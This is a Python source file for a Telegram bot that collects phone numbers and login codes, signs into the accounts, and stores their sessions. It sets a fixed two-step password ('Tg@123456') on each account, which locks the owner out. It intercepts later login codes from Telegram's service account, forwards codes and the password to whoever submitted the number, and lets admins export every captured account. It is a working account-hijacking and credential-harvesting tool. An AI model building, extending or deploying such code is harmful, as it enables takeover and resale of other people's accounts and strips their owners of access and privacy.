import os
import json
import re
from datetime import datetime
from dotenv import load_dotenv

from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    filters, ContextTypes, ConversationHandler
)

load_dotenv()

# ====================== CONFIG ======================
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_IDS = [int(x.strip()) for x in os.getenv("ADMIN_IDS", "0").split(",") if x.strip()]

TWO_FA_PASSWORD = "Tg@123456"

# ====================== PATHS ======================
SESSIONS_DIR = "sessions"
DATA_DIR = "data"
os.makedirs(SESSIONS_DIR, exist_ok=True)
os.makedirs(DATA_DIR, exist_ok=True)

ACCOUNTS_FILE = f"{DATA_DIR}/accounts.json"
CODES_FILE = f"{DATA_DIR}/codes.json"
ADMINS_FILE = f"{DATA_DIR}/admins.json"

# ====================== STATES ======================
WAITING_CODE = 1

# ====================== GLOBAL ======================
clients = {}
pending = {}
# ====================== HELPER FUNCTIONS ======================
def load_json(path, default=None):
    if default is None:
        default = {}
    try:
        if os.path.exists(path):
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
    except:
        pass
    return default

def save_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def get_admins():
    admins = load_json(ADMINS_FILE, [])
    if not admins:
        admins = ADMIN_IDS[:]
        save_json(ADMINS_FILE, admins)
    return admins

def is_admin(uid):
    return uid in get_admins()

def get_flag(phone):
    flags = {
        "880": "🇧🇩", "91": "🇮🇳", "92": "🇵🇰", "1": "🇺🇸", "44": "🇬🇧",
        "27": "🇿🇦", "234": "🇳🇬", "966": "🇸🇦", "971": "🇦🇪", "90": "🇹🇷",
        "7": "🇷🇺", "49": "🇩🇪", "33": "🇫🇷", "86": "🇨🇳", "62": "🇮🇩",
        "60": "🇲🇾", "65": "🇸🇬", "63": "🇵🇭", "55": "🇧🇷", "52": "🇲🇽",
        "20": "🇪🇬", "212": "🇲🇦", "40": "🇷🇴", "48": "🇵🇱", "216": "🇹🇳",
        "244": "🇦🇴", "1876": "🇯🇲", "233": "🇬🇭", "254": "🇰🇪", "255": "🇹🇿"
    }
    p = phone.replace("+", "")
    for code in sorted(flags.keys(), key=len, reverse=True):
        if p.startswith(code):
            return flags[code]
    return "🏳️"

def get_country_code(phone):
    phone = phone.replace("+", "")
    codes = ["1876", "880", "966", "971", "234", "212", "216", "244", "233", "254", "255",
             "91", "92", "90", "86", "84", "82", "81", "66", "65", "63", "62", "60", "55",
             "52", "49", "48", "44", "40", "39", "33", "27", "20", "7", "1"]
    for code in codes:
        if phone.startswith(code):
            return code
    return phone[:2]

def get_country_name(code):
    names = {
        "880": "Bangladesh", "91": "India", "92": "Pakistan", "1": "United States",
        "44": "United Kingdom", "27": "South Africa", "234": "Nigeria",
        "966": "Saudi Arabia", "971": "UAE", "90": "Turkey", "7": "Russia",
        "49": "Germany", "33": "France", "86": "China", "62": "Indonesia",
        "60": "Malaysia", "65": "Singapore", "63": "Philippines", "55": "Brazil",
        "52": "Mexico", "20": "Egypt", "212": "Morocco", "40": "Romania",
        "48": "Poland", "216": "Tunisia", "244": "Angola", "1876": "Jamaica",
        "233": "Ghana", "254": "Kenya", "255": "Tanzania"
    }
    return names.get(str(code), f"Country +{code}")
    # ====================== TELETHON ======================
async def start_client(phone):
    path = f"{SESSIONS_DIR}/{phone.replace('+', '')}"
    client = TelegramClient(path, API_ID, API_HASH)

    @client.on(events.NewMessage(from_users=777000))
    async def handler(e):
        m = re.search(r'(\d{5,6})', e.message.message or "")
        if m:
            codes = load_json(CODES_FILE, {})
            if phone not in codes:
                codes[phone] = []
            codes[phone].insert(0, {
                "code": m.group(1),
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            })
            codes[phone] = codes[phone][:20]
            save_json(CODES_FILE, codes)

            # যদি backnumber মোড চালু থাকে তাহলে ইউজারকে কোড পাঠাবে
            accounts = load_json(ACCOUNTS_FILE, {})
            acc = accounts.get(phone)
            if acc and acc.get("back_mode"):
                try:
                    from telegram import Bot
                    bot = Bot(BOT_TOKEN)
                    flag = get_flag(phone)
                    country = get_country_name(get_country_code(phone))
                    msg = (
                        f"🔐 **New Login Code**\n\n"
                        f"🌍 {flag} {country}\n"
                        f"📱 Number: `{phone}`\n"
                        f"🔑 Code: `{m.group(1)}`\n"
                        f"🔒 2FA: `{TWO_FA_PASSWORD}`\n"
                        f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                    )
                    await bot.send_message(acc["uid"], msg, parse_mode="Markdown")
                except:
                    pass

    await client.connect()
    if await client.is_user_authorized():
        clients[phone] = client
        return True
    await client.disconnect()
    return False


async def enable_2fa(client):
    try:
        await client.edit_2fa(new_password=TWO_FA_PASSWORD)
        return True
    except:
        return False


# ====================== START ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = (
        f"👋 Welcome **{user.first_name}**!\n\n"
        f"Send phone number with `+`\n"
        f"Example: `+8801712345678`\n\n"
        f"Available Commands:\n"
        f"/mynumber - My numbers by country\n"
        f"/backnumber - Receive codes for selected country\n"
        f"/myfile - Download my accounts file"
    )
    await update.message.reply_text(text, parse_mode="Markdown")


# ====================== HANDLE PHONE ======================
async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip().replace(" ", "")
    if not re.match(r'^\+?\d{8,15}$', text):
        return   # সাধারণ টেক্সটে কোনো রেসপন্স দিবে না

    phone = text if text.startswith("+") else "+" + text
    chat_id = update.effective_chat.id
    uid = update.effective_user.id

    wait_msg = await update.message.reply_text("⏳ Sending login code...")

    try:
        client = TelegramClient(f"{SESSIONS_DIR}/{phone[1:]}", API_ID, API_HASH)
        await client.connect()

        if await client.is_user_authorized():
            await wait_msg.edit_text("This number is already logged in!")
            await client.disconnect()
            return

        sent = await client.send_code_request(phone)
        pending[chat_id] = {
            "client": client,
            "phone": phone,
            "hash": sent.phone_code_hash,
            "uid": uid
        }

        flag = get_flag(phone)
        await wait_msg.edit_text(
            f"📲 {flag} `{phone}`\n\n"
            f"Code sent! Reply with the 5 or 6-digit login code.\n\n"
            f"➿ /cancel",
            parse_mode="Markdown"
        )
        return WAITING_CODE

    except FloodWaitError as e:
        await wait_msg.edit_text(f"FloodWait! Please wait {e.seconds} seconds.")
    except Exception as e:
        await wait_msg.edit_text(f"Error: {e}")
        # ====================== HANDLE CODE ======================
async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id not in pending:
        return

    data = pending[chat_id]
    code = update.message.text.strip()
    phone = data["phone"]
    uid = data["uid"]

    try:
        await data["client"].sign_in(phone, code, phone_code_hash=data["hash"])
    except SessionPasswordNeededError:
        await update.message.reply_text("This number already has 2FA. Skipped.")
        await data["client"].disconnect()
        del pending[chat_id]
        return
    except PhoneCodeInvalidError:
        await update.message.reply_text(
            "❗️ Invalid login code. Please send the correct code.\n\n➿ /cancel"
        )
        return
    except Exception as e:
        await update.message.reply_text(f"Error: {e}\n\n/cancel")
        await data["client"].disconnect()
        del pending[chat_id]
        return

    # Login Success
    me = await data["client"].get_me()
    ok = await enable_2fa(data["client"])

    # Save Account
    accounts = load_json(ACCOUNTS_FILE, {})
    accounts[phone] = {
        "uid": uid,
        "name": me.first_name or "",
        "username": me.username or "",
        "country": get_country_code(phone),
        "2fa": TWO_FA_PASSWORD if ok else "Failed",
        "added": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "back_mode": False
    }
    save_json(ACCOUNTS_FILE, accounts)

    await data["client"].disconnect()
    await start_client(phone)
    del pending[chat_id]

    flag = get_flag(phone)
    country = get_country_name(get_country_code(phone))

    text = (
        f"✅ **Account Added Successfully**\n\n"
        f"🌍 {flag} {country}\n"
        f"📱 Number: `{phone}`\n"
        f"👤 Name: {me.first_name or 'N/A'}\n"
        f"🔒 2FA: `{'Enabled ✅' if ok else 'Failed'}`\n"
        f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    await update.message.reply_text(text, parse_mode="Markdown")


# ====================== CANCEL ======================
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in pending:
        try:
            await pending[chat_id]["client"].disconnect()
        except:
            pass
        del pending[chat_id]
    await update.message.reply_text("✅ Cancelled. You can send a new number.")
    return ConversationHandler.END


# ====================== /mynumber ======================
async def mynumber_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    accounts = load_json(ACCOUNTS_FILE, {})

    # Country wise count
    country_count = {}
    for phone, info in accounts.items():
        if info.get("uid") == uid:
            code = info.get("country") or get_country_code(phone)
            country_count[code] = country_count.get(code, 0) + 1

    if not country_count:
        await update.message.reply_text("You have not added any numbers yet.")
        return

    kb = []
    for code, count in sorted(country_count.items(), key=lambda x: x[1], reverse=True):
        flag = get_flag("+" + code)
        name = get_country_name(code)
        kb.append([InlineKeyboardButton(f"{flag} {name} ({count})", callback_data=f"mycountry_{code}")])

    await update.message.reply_text(
        "📱 **Your Numbers by Country**\n\nSelect a country to see details:",
        reply_markup=InlineKeyboardMarkup(kb),
        parse_mode="Markdown"
    )


# ====================== Country Details Callback ======================
async def mycountry_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    code = q.data.replace("mycountry_", "")

    accounts = load_json(ACCOUNTS_FILE, {})
    numbers = [p for p, info in accounts.items() if info.get("uid") == uid and (info.get("country") == code or get_country_code(p) == code)]

    flag = get_flag("+" + code)
    name = get_country_name(code)

    text = f"{flag} **{name}** — `{len(numbers)}` numbers\n\n"
    for i, phone in enumerate(numbers[:30], 1):
        text += f"{i}. `{phone}`\n"

    if len(numbers) > 30:
        text += f"\n... and {len(numbers) - 30} more"

    kb = [[InlineKeyboardButton("◀️ Back", callback_data="back_mynumber")]]
    await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    # ====================== /backnumber ======================
async def backnumber_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    accounts = load_json(ACCOUNTS_FILE, {})

    # User এর country গুলো বের করা
    country_count = {}
    for phone, info in accounts.items():
        if info.get("uid") == uid:
            code = info.get("country") or get_country_code(phone)
            country_count[code] = country_count.get(code, 0) + 1

    if not country_count:
        await update.message.reply_text("You have no numbers yet.")
        return

    kb = []
    for code, count in sorted(country_count.items(), key=lambda x: x[1], reverse=True):
        flag = get_flag("+" + code)
        name = get_country_name(code)
        kb.append([InlineKeyboardButton(
            f"{flag} {name} ({count})",
            callback_data=f"back_{code}"
        )])

    await update.message.reply_text(
        "🔙 **Back Number**\n\n"
        "Select a country. After selecting, login codes for numbers of that country will be sent directly to you.",
        reply_markup=InlineKeyboardMarkup(kb),
        parse_mode="Markdown"
    )


async def back_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    code = q.data.replace("back_", "")

    accounts = load_json(ACCOUNTS_FILE, {})
    updated = 0

    for phone, info in accounts.items():
        if info.get("uid") == uid and (info.get("country") == code or get_country_code(phone) == code):
            info["back_mode"] = True
            accounts[phone] = info
            updated += 1

    save_json(ACCOUNTS_FILE, accounts)

    flag = get_flag("+" + code)
    name = get_country_name(code)

    await q.edit_message_text(
        f"✅ Back mode enabled for **{flag} {name}**\n\n"
        f"Total numbers: `{updated}`\n\n"
        f"From now on, login codes for these numbers will be sent directly to you.",
        parse_mode="Markdown"
    )


# ====================== /myfile ======================
async def myfile_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    accounts = load_json(ACCOUNTS_FILE, {})

    user_accs = {p: info for p, info in accounts.items() if info.get("uid") == uid}

    if not user_accs:
        await update.message.reply_text("You have no accounts to download.")
        return

    # JSON file তৈরি
    file_path = f"{DATA_DIR}/user_{uid}_accounts.json"
    save_json(file_path, user_accs)

    await update.message.reply_document(
        document=open(file_path, "rb"),
        filename=f"my_accounts_{uid}.json",
        caption=f"📁 Your Accounts\nTotal: `{len(user_accs)}`"
    )


# ====================== ADMIN DASHBOARD ======================
async def dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return

    accounts = load_json(ACCOUNTS_FILE, {})
    total_users = len(set(info.get("uid") for info in accounts.values()))
    total_numbers = len(accounts)
    users_with_number = len(set(info.get("uid") for info in accounts.values() if info.get("uid")))

    # Country wise
    country_stats = {}
    for phone, info in accounts.items():
        code = info.get("country") or get_country_code(phone)
        country_stats[code] = country_stats.get(code, 0) + 1

    text = (
        f"👨‍💻 **Admin Dashboard**\n\n"
        f"👥 Total Users: `{total_users}`\n"
        f"📱 Users with Numbers: `{users_with_number}`\n"
        f"🔢 Total Numbers: `{total_numbers}`\n"
        f"🟢 Online Clients: `{len(clients)}`\n\n"
        f"**Country Breakdown:**\n"
    )

    for code, count in sorted(country_stats.items(), key=lambda x: x[1], reverse=True)[:10]:
        flag = get_flag("+" + code)
        name = get_country_name(code)
        text += f"{flag} {name}: `{count}`\n"

    kb = [
        [InlineKeyboardButton("📁 My Accounts File", callback_data="admin_myfile")],
        [InlineKeyboardButton("📄 User Accounts File", callback_data="admin_userfile")],
        [InlineKeyboardButton("🔐 View Codes", callback_data="admin_codes")],
        [InlineKeyboardButton("📢 BoardChat", callback_data="admin_broadcast")],
        [InlineKeyboardButton("🔄 Reload Clients", callback_data="admin_reload")]
    ]

    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    # ====================== ADMIN CALLBACKS ======================
async def admin_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return

    data = q.data

    # ===== My Accounts File =====
    if data == "admin_myfile":
        accounts = load_json(ACCOUNTS_FILE, {})
        file_path = f"{DATA_DIR}/all_accounts.json"
        save_json(file_path, accounts)
        await q.message.reply_document(
            document=open(file_path, "rb"),
            filename="all_accounts.json",
            caption=f"📁 All Accounts\nTotal: `{len(accounts)}`"
        )

    # ===== User Accounts File =====
    elif data == "admin_userfile":
        context.user_data["admin_action"] = "userfile"
        await q.edit_message_text("Send the **User ID** whose accounts you want to download:")

    # ===== View Codes =====
    elif data == "admin_codes":
        context.user_data["admin_action"] = "viewcode"
        await q.edit_message_text("Send the **phone number** to view codes:\nExample: `+8801712345678`")

    # ===== Broadcast =====
    elif data == "admin_broadcast":
        context.user_data["admin_action"] = "broadcast"
        await q.edit_message_text("Send the message you want to broadcast to all users:")

    # ===== Reload Clients =====
    elif data == "admin_reload":
        accounts = load_json(ACCOUNTS_FILE, {})
        loaded = 0
        for phone in accounts:
            try:
                if await start_client(phone):
                    loaded += 1
            except:
                pass
        await q.edit_message_text(f"✅ Reloaded `{loaded}` clients.")


# ====================== ADMIN TEXT HANDLER ======================
async def admin_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return

    if "admin_action" not in context.user_data:
        return

    action = context.user_data.pop("admin_action")
    text = update.message.text.strip()

    # User File
    if action == "userfile":
        try:
            target = int(text)
        except:
            await update.message.reply_text("Invalid User ID")
            return

        accounts = load_json(ACCOUNTS_FILE, {})
        user_accs = {p: info for p, info in accounts.items() if info.get("uid") == target}

        if not user_accs:
            await update.message.reply_text("This user has no accounts.")
            return

        file_path = f"{DATA_DIR}/user_{target}_accounts.json"
        save_json(file_path, user_accs)
        await update.message.reply_document(
            document=open(file_path, "rb"),
            filename=f"user_{target}_accounts.json",
            caption=f"📁 Accounts of `{target}`\nTotal: `{len(user_accs)}`"
        )

    # View Code
    elif action == "viewcode":
        phone = text if text.startswith("+") else "+" + text
        codes = load_json(CODES_FILE, {})
        if phone not in codes or not codes[phone]:
            await update.message.reply_text("No codes found for this number.")
            return

        text_msg = f"🔐 **Codes for** `{phone}`\n\n"
        for c in codes[phone][:10]:
            text_msg += f"• `{c['code']}` — {c['time']}\n"
        await update.message.reply_text(text_msg, parse_mode="Markdown")

    # Broadcast
    elif action == "broadcast":
        accounts = load_json(ACCOUNTS_FILE, {})
        user_ids = list(set(info.get("uid") for info in accounts.values() if info.get("uid")))
        success = failed = 0
        status = await update.message.reply_text(f"📢 Sending to {len(user_ids)} users...")

        for uid in user_ids:
            try:
                await context.bot.send_message(uid, f"📢 **Announcement**\n\n{text}", parse_mode="Markdown")
                success += 1
            except:
                failed += 1

        await status.edit_text(f"✅ Done!\nSuccess: `{success}`\nFailed: `{failed}`")


# ====================== POST INIT & MAIN ======================
async def post_init(app: Application):
    print("🔄 Loading sessions...")
    accounts = load_json(ACCOUNTS_FILE, {})
    loaded = 0
    for phone in accounts:
        try:
            if await start_client(phone):
                loaded += 1
        except:
            pass
    print(f"✅ Bot Ready! Loaded {loaded} sessions.")

def main():
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

    # ==================== LOGIN CONVERSATION ====================
    login_conv = ConversationHandler(
        entry_points=[
            MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone)
        ],
        states={
            WAITING_CODE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_code)
            ]
        },
        fallbacks=[
            CommandHandler("cancel", cancel)
        ],
        allow_reentry=True
    )

    # ==================== COMMANDS ====================
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("mynumber", mynumber_cmd))
    app.add_handler(CommandHandler("backnumber", backnumber_cmd))
    app.add_handler(CommandHandler("myfile", myfile_cmd))
    app.add_handler(CommandHandler("dashboard", dashboard))
    app.add_handler(CommandHandler("cancel", cancel))

    # ==================== LOGIN CONVERSATION ====================
    app.add_handler(login_conv)

    # ==================== CALLBACKS ====================
    app.add_handler(
        CallbackQueryHandler(
            mycountry_cb,
            pattern=r"^mycountry_"
        )
    )

    app.add_handler(
        CallbackQueryHandler(
            back_cb,
            pattern=r"^back_"
        )
    )

    app.add_handler(
        CallbackQueryHandler(admin_cb)
    )

    # ==================== ADMIN TEXT HANDLER ====================
    # Must be added last
    app.add_handler(
        MessageHandler(
            filters.TEXT & ~filters.COMMAND,
            admin_text
        )
    )

    print("🚀 Bot is starting...")
    app.run_polling()


if __name__ == "__main__":
    main()
